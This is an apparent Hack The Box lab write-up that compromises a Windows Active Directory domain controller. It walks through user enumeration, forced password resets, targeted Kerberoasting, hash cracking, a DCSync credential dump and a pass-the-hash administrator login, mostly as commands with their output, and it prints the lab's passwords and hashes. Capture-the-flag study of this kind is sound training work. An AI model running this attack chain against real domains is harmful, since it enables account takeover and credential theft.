# Administrator - HTB Write-up (Work in progress)
<img src="https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png" width="200" height="200">

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: 

Username: `Olivia` 
Password: `ichliebedich`

## Initial portscan
```shell
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-10 00:57:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52801/tcp open  msrpc         Microsoft Windows RPC
60218/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60223/tcp open  msrpc         Microsoft Windows RPC
60245/tcp open  msrpc         Microsoft Windows RPC
60249/tcp open  msrpc         Microsoft Windows RPC
60283/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-10T00:58:04
|_  start_date: N/A
|_clock-skew: 6h59m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## Port 21 - FTP
Can't access with `Olivia` credentials.

## Port 53 - Simple DNS
Let's run gobuster in dns mode, maybe we can get a subdomain.

```shell
❯ gobuster dns -d $domain -r $ip -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     administrator.htb
[+] Threads:    10
[+] Resolver:   10.129.74.224
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.administrator.htb
Found: gc._msdcs.administrator.htb
Found: domaindnszones.administrator.htb
Found: forestdnszones.administrator.htb
```
Add all the domians to `/etc/hosts`.

## Port 88 - Kerberos

**Users enumeration**
```shell
❯ ./kerbrute -d $domain --dc $ip userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/09/25 - Ronnie Flathers @ropnop

2025/03/09 14:19:32 >  Using KDC(s):
2025/03/09 14:19:32 >   10.129.74.224:88

2025/03/09 14:19:32 >  [+] VALID USERNAME:       michael@administrator.htb
2025/03/09 14:19:35 >  [+] VALID USERNAME:       benjamin@administrator.htb
2025/03/09 14:19:44 >  [+] VALID USERNAME:       administrator@administrator.htb
2025/03/09 14:19:44 >  [+] VALID USERNAME:       emily@administrator.htb
2025/03/09 14:19:48 >  [+] VALID USERNAME:       olivia@administrator.htb
2025/03/09 14:19:56 >  [+] VALID USERNAME:       ethan@administrator.htb
```
DOMAIN SID: `S-1-5-21-1088858960-373806567-254189436`

## Port 445 - SMB/CIFS
```shell
❯ nxc smb $ip -u Olivia -p ichliebedich --shares
SMB         10.129.74.224   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.224   445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.74.224   445    DC               [*] Enumerated shares
SMB         10.129.74.224   445    DC               Share           Permissions     Remark
SMB         10.129.74.224   445    DC               -----           -----------     ------
SMB         10.129.74.224   445    DC               ADMIN$                          Remote Admin
SMB         10.129.74.224   445    DC               C$                              Default share
SMB         10.129.74.224   445    DC               IPC$            READ            Remote IPC
SMB         10.129.74.224   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.74.224   445    DC               SYSVOL          READ            Logon server share 
```

## BloodyAD - Writable AD Objects
```shell
❯ bloodyAD --host $ip -d administrator.htb -u Olivia -p ichliebedich get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=administrator,DC=htb
permission: WRITE

distinguishedName: CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
permission: WRITE

distinguishedName: CN=Michael Williams,CN=Users,DC=administrator,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

## BloodyAD - Change the password of michael user
In the previous run we saw that we have access to michael user, let's change his password.

```shell
❯ bloodyAD --host $ip -d administrator.htb -u Olivia -p ichliebedich set password michael password123
[+] Password changed successfully!
```

## Analyzing with Bloodhound CE
Use bloodhound-python to dump all info from AD then upload to BloodHound CE to analysis.

It reveals that user `michael` can change the password of user `benjamin` by using the `ForceChangePassword` method.

## Change the password of user benjamin
```shell
❯ pth-net rpc password "benjamin" "newP@ssword2022" -U "ADMINISTRATOR"/"michael"%"password123" -S "10.129.74.224"
E_md4hash wrapper called.
```

**New credentials:**
`benjamin`/`newP@ssword2022`

## Using new credentials
We try the new credentials in all services again. In the ftp we find the file `Backup.psafe3`.

Doing some research we can get the hash for john using `pwsafe2john` utility.

```shell
❯ pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

Now use it with john-the-ripper.
```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt Backup.psafe3.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-03-09 23:50) 6.666g/s 81920p/s 81920c/s 81920C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Credentials of file**
`tekieromucho`

**Contents of the file**
- `alenxander` / `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
- `emily` / `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- `emma` / `WwANQWnmJnGV07WQN8bMS7FMAbjNur`

## Bloodhound GUI - emily
In the bloodhound GUI we can see that the user `emily` has `GenericWrite` permission to the `ethan` user.

Let's use targetedKerberoast for this purpose to get the a kerberos hash for the user.

https://github.com/ShutdownRepo/targetedKerberoast

```shell
❯ python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$72a994892e4c91fabe3cabe35594e7a2$3df6dbfc2fe4b8e62b80fc1acfe6da4bc32c0934722932d1b51d78fb45a57347291ad43483b64a6d7dcbd00f902650aa03ba4430a36c3bc1e1a361bb138bc868a0cd7a7d7cd6bf6bd30011a48dccdc23002b854a13e8562f5eb2d791aa992439fb0fa79cea5f4d6988154ce7262727b177202645df80766ea7e078e66ec0c10872e9ad73fb1159c7265bbb40bbeff2ef240438cd4149eef7fd6565e7947ab4bdd9809d2febef7a3ae18872bdf30a76a67a9c53504a6fe99d48bb27abbabc1c5321920bf9afa9a82e929b176ade8e87c15d751110621057b267a7e09a95789bf1270da114f2f10f0b1165720e2b9f4a6f07fd9e00887d99e8a18ca52ee4d1e06f9d6bfa8f4129544edf09ebdee1d323031f989fcf8d93dbdf337b0e2ec62610a0d5f2c4453e1cd3195b94083c77d24ccd2038c1dfb078370e0d309f67f0188fd8546780772a57739958364fb0d676d918396bf131f63f0b1ee4cd0d1a7635dfa85aa220afc61b2f014aed7adcf1e23c80d5ccccd783cb4c3a198b3b2afe991918c86c287b39a57babf0e59087d24098a7fa196b84946ea9227ee0f1b5f2cbc3439270e63d7dead0a669d91fa3c2216671f2ead1b99c4adb617aba0ac7d9d9b0e7d862eb4255edb67a653cac179bb3279cf34dc60d155992e658caba09fa3e968e3c31e9285fd1ef7a50af8973c839cfe7862ad1b0f896c7c2e511e7de3fd5fa6698c1f886cb2b244617a7ee68fecb7d8db3cfccc8f4e8963864af5deb010b21394ad5e7fca4555034dc6b9644ccb6ed9ff0fdc23101caff943552d2acaaaca9ba4e32ef92ca50f6750455a851829e91cef0ab001fab2908614e2557bca71bc2eda2c9877befa05392dbe183fd23773838310d3f226703af2fcfc6352faa9682361eccd35864a17464188d1cd6d5f7ed47b2ba0aea1f821e5cf9d8b7abe5edd8b1ff4dc8fbf30589bf053fc4e8b7a4ee0dd606244f75826e68bfc69d6bd4f573da17e8f6ca53a81c2f836da7be73420dedbd625cf376aee22abc076dd3b538679b951e997ecf1533896e887e8de7b6dd2989006b50b09affa05e12ea182e4521dce0fb3a324d25c8a8d717db98b38ba07134b4a695d3efb5b8aa643fd05dca3778bee3f7c77083f854de68f1fd267617d6c9b76a0d5fbda6886fc37b1467d5358bff8d33437dc0510e0a213624f92bd10a873b034b3e8cc541248cc8e26c6fb47bd226ac87f12881169b1420a951d9eed58e31bbe82e7272535db553d8f680d4e6c6c261aca44da7420a150315c4e1a8693c915705db5287fec5145fca220c603ee2f0a796b5499f5e8e5bd20167365d40e36aae3a023481bfa8e2333f02f331f50eded8d73bcc956aac24fa01b2a1a53a964d15cf93fc49a805b76ad49424cd2ebfa5632ea9edaf6b02efdeb00726b3aab0b8c478248c21ba0ef3afc93545390687119baf136921d6e650fecf338cc2cceb5619d6777c0450ccf4ee2729d903d830c04215d492467bb2155c824e85c4ec539fe0506c55d492e8cabfdf4800e2
[VERBOSE] SPN removed successfully for (ethan)
```

### Cracking the hash
```shell
❯ hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt --show
limpbizkit
```

## Privilege Escalation using ethan user

Ethan user has three privileges:
- `GetChangesAll`
- `GetChanges`
- `GetChangesInFilteredSet`

We can use `GetChanges` privilege to dump secrets.

```shell
❯ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'ADMINISTRATOR.HTB'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959
administrator.htb\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b
administrator.htb\michael:des-cbc-md5:43c2bc231598012a
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e
administrator.htb\benjamin:des-cbc-md5:b6f84a864376a4ad
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

Using the NThash we can logon as Administrator.

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::`

`❯ evil-winrm -i $ip -h aad3b435b51404eeaad3b435b51404ee -u Administrator`